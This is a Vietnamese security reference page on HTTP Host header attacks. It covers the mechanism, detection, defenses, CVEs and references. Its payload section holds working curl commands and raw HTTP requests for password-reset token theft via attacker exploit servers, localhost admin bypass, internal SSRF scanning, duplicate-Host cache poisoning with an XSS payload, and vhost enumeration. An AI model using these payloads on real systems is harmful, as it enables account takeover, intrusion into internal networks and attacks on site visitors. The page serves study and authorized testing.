# HTTP Host Header Attacks

> Tin tưởng header Host dẫn tới cache poisoning, đầu độc đặt lại mật khẩu (password-reset poisoning), SSRF. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/http_host_header_attacks.md`](../../../../Troubleshooting_Guide/http_host_header_attacks.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A05:2021 Misconfiguration
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Tấn công Host header lạm dụng thực tế rằng header `Host` do kẻ tấn công kiểm soát nhưng thường được ứng dụng tin tưởng như thể đó là một giá trị an toàn do máy chủ định nghĩa. Vì các framework phơi bày nó như một cách tiện lợi để biết "mình đang là site nào", lập trình viên dùng nó để xây dựng URL, định tuyến request, và đưa ra quyết định bảo mật — tất cả đều có thể bị kẻ tấn công lật đổ.

## Cơ chế hoạt động (How it works)
Client kiểm soát hoàn toàn header `Host` (và các header chuyển tiếp như `X-Forwarded-Host`). Một ứng dụng phản chiếu nó vào phản hồi, dùng nó để dựng các liên kết tuyệt đối (ví dụ URL đặt lại mật khẩu), định tuyến lưu lượng tới một upstream được đặt tên theo Host, hoặc kiểm soát truy cập dựa trên một giá trị Host như `localhost`, đều có thể bị lừa khi gửi một Host giả mạo, trùng lặp, hoặc dị dạng. Lỗi bắt nguồn từ việc đối xử với một input không tin cậy ở phạm vi request như một danh tính tin cậy của hệ thống triển khai.

## Tác động (Impact)
Tùy thuộc vào sink: đầu độc đặt lại mật khẩu chiếm tài khoản bằng cách chuyển hướng token đặt lại tới máy chủ của kẻ tấn công; lạm dụng dựa trên định tuyến biến front-end thành điểm xoay SSRF vào mạng nội bộ; cache poisoning lưu giữ nội dung được tiêm (thường là XSS) vào mọi lần cache hit; và các kiểm tra truy cập dựa trên Host có thể bị vượt qua để chạm tới chức năng quản trị. Mức độ nghiêm trọng dao động từ trung bình tới nghiêm trọng khi nó dẫn tới chiếm tài khoản hoặc truy cập mạng nội bộ.

## Cách phát hiện (How to detect)
- Gửi một `Host` tùy ý và xem request có còn thành công (200) và/hoặc giá trị có được phản chiếu trong body, trong redirect `Location`, hoặc trong các liên kết hay không.
- Thử `localhost`/`127.0.0.1` đối với các đường dẫn bị kiểm soát như `/admin` để phát hiện kiểm soát truy cập dựa trên Host.
- Tiêm `X-Forwarded-Host`, `X-Host`, hoặc một header `Host` trùng lặp và quan sát phản chiếu hoặc thay đổi định tuyến; kiểm tra xem một port được tiêm có xuất hiện chưa được escape trong phản hồi hoặc email hay không.
- Với SSRF dựa trên định tuyến, trỏ Host tới các IP nội bộ và tìm các khác biệt về phản hồi/thời gian.

## Khai thác (tóm tắt) (Exploitation)
Dò xem Host có được phản chiếu, định tuyến theo, hoặc được kiểm tra hay không, rồi điều hướng tấn công phù hợp: với đầu độc đặt lại mật khẩu, đặt Host (hoặc `X-Forwarded-Host`) trỏ tới máy chủ khai thác của bạn để liên kết đặt lại mang theo token của nạn nhân về cho bạn; với SSRF định tuyến, quét `Host: 192.168.0.X` để tìm và điều khiển các host nội bộ; với cache poisoning, gửi một Host trùng lặp/quá khổ làm desync giữa cache và backend. Các payload đầy đủ nằm trong mục Payload và tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Dò xem Host có được tin tưởng không (Probing whether the Host is trusted)
Các kiểm tra nhanh để xem ứng dụng có phản chiếu, định tuyến theo, hoặc kiểm tra Host hay không.

```bash
# Arbitrary Host accepted?
curl -sk https://TARGET/ -H "Host: arbitrary.com" -o /dev/null -w "%{http_code}\n"

# Localhost / loopback bypass of access control
curl -sk https://TARGET/admin -H "Host: localhost"  -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/admin -H "Host: 127.0.0.1"  -o /dev/null -w "%{http_code}\n"
curl -sk https://TARGET/admin -H "Host: 0.0.0.0"    -o /dev/null -w "%{http_code}\n"

# Absolute-URL request line (routing still follows Host)
curl -sk -H "Host: evil.com" "https://TARGET/"

# Port injection (is the port reflected?)
curl -sk https://TARGET/ -H "Host: TARGET:TESTPORT" -o /dev/null
```

### Đầu độc đặt lại mật khẩu (Password reset poisoning)
Khi URL đặt lại được dựng từ Host, chuyển hướng token tới một máy chủ bạn kiểm soát.

```bash
# 1. Poison the Host so the reset link points at your server
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: YOUR-EXPLOIT-SERVER.exploit-server.net"

# 2. Read the token from your exploit-server log:
#    GET /forgot-password?temp-forgot-password-token=abc123

# 3. Replay the token against the real host
#    https://TARGET/forgot-password?temp-forgot-password-token=abc123
```

Nếu ứng dụng tin tưởng các header chuyển tiếp thay cho (hoặc bên cạnh) Host, hãy tiêm chúng:

```bash
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: TARGET.net" \
  -H "X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net"
```

Các header khác để fuzz: `X-Host`, `X-Forwarded-Server`, `X-Original-Host`, `X-Rewrite-URL`.

Khi chỉ có **port** được phản chiếu (trong email HTML), thoát ra bằng dangling markup để bắt mật khẩu trong một URL:

```bash
curl -X POST https://TARGET/forgot-password \
  -d "username=carlos" \
  -H "Host: TARGET:'<a href=\"//YOUR-SERVER.net/?"
```

### Vượt kiểm soát truy cập (Access-control bypass)
Giả mạo một Host nội bộ để đánh bại kiểm soát quản trị dựa trên IP/Host.

```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

Trong trình duyệt, chặn trong Burp và viết lại `Host: TARGET` thành `Host: localhost`.

### SSRF dựa trên định tuyến (Routing-based SSRF)
Khi header Host điều khiển định tuyến proxy/upstream, trỏ nó tới các IP nội bộ và quét.

```http
GET / HTTP/1.1
Host: 192.168.0.1
```

Brute-force `192.168.0.X` (1–255) bằng Burp Intruder — tắt "Update Host header to match target". Khi tìm được một host nội bộ, điều khiển các hành động có xác thực đối với nó:

```http
GET /admin/delete?csrf=TOKEN&username=carlos HTTP/1.1
Host: 192.168.0.X
Cookie: session=SESSION
```

Một URL tuyệt đối trong dòng request có thể vượt qua kiểm tra domain trong khi định tuyến vẫn theo Host:

```http
GET https://TARGET.net/ HTTP/1.1
Host: 192.168.0.X
Cookie: session=SESSION
```

### Cache poisoning qua Host (Cache poisoning via Host)
Làm cho cache và backend bất đồng, hoặc tiêm markup qua port được phản chiếu.

```http
GET /?cb=1337 HTTP/1.1
Host: TARGET.net
Host: YOUR-EXPLOIT-SERVER.net
```

Gửi Host trùng lặp thủ công trong Burp Repeater — `curl` sẽ khử trùng lặp chúng.

```http
GET / HTTP/1.1
Host: TARGET.com:1337<script>alert(1)</script>
```

Nếu port chưa được escape rơi vào một phản hồi đã cache, điều này trở thành stored XSS cho mọi khách truy cập.

### Liệt kê virtual host (Virtual host enumeration)
Trên các IP dùng chung, quét các vhost ứng viên qua header Host.

```bash
for vhost in admin staging dev internal api; do
  echo -n "$vhost: "
  curl -sk -o /dev/null -w "%{http_code}" https://TARGET/ -H "Host: $vhost.company.com"
  echo
done
```

### Host header → lựa chọn tấn công (Host header → attack selection)
Ánh xạ cách Host được sử dụng quan sát được sang cuộc tấn công mà nó cho phép.

| Cách dùng header Host | Tấn công |
|-----------------|--------|
| Dựng URL email đặt lại | Đầu độc đặt lại mật khẩu |
| Kiểm soát `if host == 'localhost'` | Vượt panel quản trị |
| Định tuyến proxy (Host → upstream) | SSRF nội bộ |
| Phân tích Host trùng lặp | Cache poisoning |
| Port Host trong email HTML | Dangling markup |
| Định tuyến virtual-host | Phát hiện host nội bộ |

## Phòng chống (Defenses)
1. Đừng tin Host: kiểm tra mọi `Host` đến đối chiếu với một allow-list các domain hợp lệ đã biết và từ chối (hoặc phục vụ một vhost mặc định cho) bất kỳ thứ gì khác.
2. Dựng các URL tuyệt đối từ một base URL được cấu hình phía máy chủ, không bao giờ từ Host của request.
3. Loại bỏ hoặc bỏ qua các header chuyển tiếp (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`, v.v.) trừ khi chúng đến từ một proxy tin cậy, đã xác thực.
4. Từ chối các request mơ hồ — header Host trùng lặp, URI dòng-request tuyệt đối, và port dị dạng — tại biên; cấu hình web server với một vhost mặc định/chuẩn tắc nghiêm ngặt.
5. Không bao giờ đưa ra quyết định kiểm soát truy cập hoặc định tuyến dựa trên giá trị Host.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=HTTP+Host+Header+Attacks
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=HTTP+Host+Header+Attacks
- **Exploit-DB** — https://www.exploit-db.com/search?q=HTTP+Host+Header+Attacks
- **GitHub Advisories** — https://github.com/advisories?query=HTTP+Host+Header+Attacks
- **OSV** — https://osv.dev/list?q=HTTP+Host+Header+Attacks
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `HTTP Host Header Attacks <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2017-8295` — Đầu độc đặt lại mật khẩu WordPress qua giá trị `SERVER_NAME`/Host, khiến kẻ tấn công có thể làm cho liên kết email đặt lại trỏ tới một host họ kiểm soát.
- `CVE-2016-10033` — RCE trong PHPMailer; tuy không đặc thù về Host header, nó cho thấy việc tin tưởng các giá trị suy ra từ request trong luồng email dẫn tới xâm phạm ra sao (thường đi kèm với lạm dụng liên kết đặt lại).
- _Sự cố kinh điển: Django giới thiệu thiết lập `ALLOWED_HOSTS` chính là để chặn đầu độc Host header trong các luồng đặt lại mật khẩu và URL tuyệt đối sau khi bị lạm dụng trong thực tế._

## Tham khảo (References)
- PortSwigger Web Security Academy — HTTP Host header attacks: https://portswigger.net/web-security/host-header
- OWASP — Web Security Testing Guide, Testing for Host Header Injection: https://owasp.org/www-project-web-security-testing-guide/
- RFC 7230 §5.4 (Host) and RFC 9112 §3.2 — HTTP/1.1 message routing and the Host header.
